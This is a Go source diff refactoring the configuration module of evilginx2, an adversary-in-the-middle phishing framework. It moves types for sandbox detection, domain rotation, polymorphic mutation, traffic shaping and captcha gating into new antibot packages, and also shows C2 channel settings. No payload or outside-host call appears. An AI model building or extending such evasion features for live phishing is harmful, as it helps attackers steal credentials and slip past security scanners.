@@ -9,6 +9,9 @@ import (
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/core/antibot/infra"
+	"github.com/kgretzky/evilginx2/core/antibot/response"
+	"github.com/kgretzky/evilginx2/core/antibot/signals"
 
 	"github.com/spf13/viper"
 )
@@ -153,12 +156,12 @@ type Config struct {
 
 	jsObfuscationConfig    *JSObfuscationConfig
 	mlDetectorConfig       *MLDetectorConfig
-	captchaConfig          *CaptchaConfig
-	domainRotationConfig   *DomainRotationConfig
-	trafficShapingConfig   *TrafficShapingConfig
-	sandboxDetectionConfig *SandboxDetectionConfig
+	captchaConfig          *response.CaptchaConfig
+	domainRotationConfig   *infra.DomainRotationConfig
+	trafficShapingConfig   *signals.TrafficShapingConfig
+	sandboxDetectionConfig *signals.SandboxDetectionConfig
 	c2ChannelConfig        *C2Config
-	polymorphicConfig      *PolymorphicConfig
+	polymorphicConfig      *infra.PolymorphicConfig
 	cloudflareWorkerConfig *CloudflareConfig
 	lureGenerationConfig   *LureGenerationConfig
 	phishletConfig         map[string]*PhishletConfig
@@ -215,12 +218,12 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 		jsObfuscationConfig:    &JSObfuscationConfig{},
 		mlDetectorConfig:       &MLDetectorConfig{Enabled: false, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
-		captchaConfig:          &CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]ProviderConfig)},
-		domainRotationConfig:   &DomainRotationConfig{Enabled: false, Strategy: "round-robin", RotationInterval: 60, MaxDomains: 10, AutoGenerate: false},
-		trafficShapingConfig:   &TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
-		sandboxDetectionConfig: &SandboxDetectionConfig{Enabled: false, Mode: "passive", ServerSideChecks: true, ClientSideChecks: true, CacheResults: true, CacheDuration: 30, DetectionThreshold: 0.6, ActionOnDetection: "block"},
+		captchaConfig:          &response.CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]response.ProviderConfig)},
+		domainRotationConfig:   &infra.DomainRotationConfig{Enabled: false, Strategy: "round-robin", RotationInterval: 60, MaxDomains: 10, AutoGenerate: false},
+		trafficShapingConfig:   &signals.TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
+		sandboxDetectionConfig: &signals.SandboxDetectionConfig{Enabled: false, Mode: "passive", ServerSideChecks: true, ClientSideChecks: true, CacheResults: true, CacheDuration: 30, DetectionThreshold: 0.6, ActionOnDetection: "block"},
 		c2ChannelConfig:        &C2Config{Enabled: false, Transport: "https", Servers: make([]C2Server, 0), HeartbeatInterval: 300, RetryInterval: 30, MaxRetries: 3, CertPinning: false, Compression: true, ChunkSize: 4096},
-		polymorphicConfig:      &PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
+		polymorphicConfig:      &infra.PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
 		cloudflareWorkerConfig: &CloudflareConfig{},
 		lureGenerationConfig:   &LureGenerationConfig{Strategy: "realistic"},
 		phishletConfig:         make(map[string]*PhishletConfig),
@@ -1394,7 +1397,7 @@ func (c *Config) IsMLDetectorEnabled() bool {
 	return c.mlDetectorConfig != nil && c.mlDetectorConfig.Enabled
 }
 
-func (c *Config) GetCaptchaConfig() *CaptchaConfig {
+func (c *Config) GetCaptchaConfig() *response.CaptchaConfig {
 	return c.captchaConfig
 }
 
@@ -1407,7 +1410,7 @@ func (c *Config) SetCaptchaEnabled(enabled bool) {
 
 func (c *Config) SetCaptchaProvider(provider string) error {
 	if c.captchaConfig.Providers == nil {
-		c.captchaConfig.Providers = make(map[string]ProviderConfig)
+		c.captchaConfig.Providers = make(map[string]response.ProviderConfig)
 	}
 
 	// Check if provider config exists
@@ -1424,10 +1427,10 @@ func (c *Config) SetCaptchaProvider(provider string) error {
 
 func (c *Config) SetCaptchaProviderConfig(provider string, siteKey string, secretKey string, options map[string]string) {
 	if c.captchaConfig.Providers == nil {
-		c.captchaConfig.Providers = make(map[string]ProviderConfig)
+		c.captchaConfig.Providers = make(map[string]response.ProviderConfig)
 	}
 
-	c.captchaConfig.Providers[provider] = ProviderConfig{
+	c.captchaConfig.Providers[provider] = response.ProviderConfig{
 		SiteKey:   siteKey,
 		SecretKey: secretKey,
 		Options:   options,
@@ -1445,7 +1448,7 @@ func (c *Config) SetCaptchaRequireForLures(require bool) {
 	c.cfg.WriteConfig()
 }
 
-func (c *Config) GetDomainRotationConfig() *DomainRotationConfig {
+func (c *Config) GetDomainRotationConfig() *infra.DomainRotationConfig {
 	return c.domainRotationConfig
 }
 
@@ -1486,10 +1489,10 @@ func (c *Config) SetDomainRotationMaxDomains(max int) {
 
 func (c *Config) AddDomainRotationDNSProvider(name string, provider string, apiKey string, apiSecret string, zone string, options map[string]string) {
 	if c.domainRotationConfig.DNSProviders == nil {
-		c.domainRotationConfig.DNSProviders = make(map[string]DomainRotationDNSProvider)
+		c.domainRotationConfig.DNSProviders = make(map[string]infra.DomainRotationDNSProvider)
 	}
 
-	c.domainRotationConfig.DNSProviders[name] = DomainRotationDNSProvider{
+	c.domainRotationConfig.DNSProviders[name] = infra.DomainRotationDNSProvider{
 		Provider:  provider,
 		APIKey:    apiKey,
 		APISecret: apiSecret,
@@ -1502,7 +1505,7 @@ func (c *Config) AddDomainRotationDNSProvider(name string, provider string, apiK
 	c.cfg.WriteConfig()
 }
 
-func (c *Config) GetTrafficShapingConfig() *TrafficShapingConfig {
+func (c *Config) GetTrafficShapingConfig() *signals.TrafficShapingConfig {
 	return c.trafficShapingConfig
 }
 
@@ -1545,10 +1548,10 @@ func (c *Config) SetTrafficShapingBandwidthLimit(limit int64) {
 
 func (c *Config) SetTrafficShapingGeoRule(country string, rateLimit int, burstSize int, priority int, blocked bool) {
 	if c.trafficShapingConfig.GeoRules == nil {
-		c.trafficShapingConfig.GeoRules = make(map[string]*GeoRuleConfig)
+		c.trafficShapingConfig.GeoRules = make(map[string]*signals.GeoRuleConfig)
 	}
 
-	c.trafficShapingConfig.GeoRules[country] = &GeoRuleConfig{
+	c.trafficShapingConfig.GeoRules[country] = &signals.GeoRuleConfig{
 		RateLimit: rateLimit,
 		BurstSize: burstSize,
 		Priority:  priority,
@@ -1560,7 +1563,7 @@ func (c *Config) SetTrafficShapingGeoRule(country string, rateLimit int, burstSi
 	c.cfg.WriteConfig()
 }
 
-func (c *Config) GetSandboxDetectionConfig() *SandboxDetectionConfig {
+func (c *Config) GetSandboxDetectionConfig() *signals.SandboxDetectionConfig {
 	return c.sandboxDetectionConfig
 }
 
@@ -1681,7 +1684,7 @@ func (c *Config) SetC2ChannelAuthToken(token string) {
 	c.cfg.WriteConfig()
 }
 
-func (c *Config) GetPolymorphicConfig() *PolymorphicConfig {
+func (c *Config) GetPolymorphicConfig() *infra.PolymorphicConfig {
 	return c.polymorphicConfig
 }
 
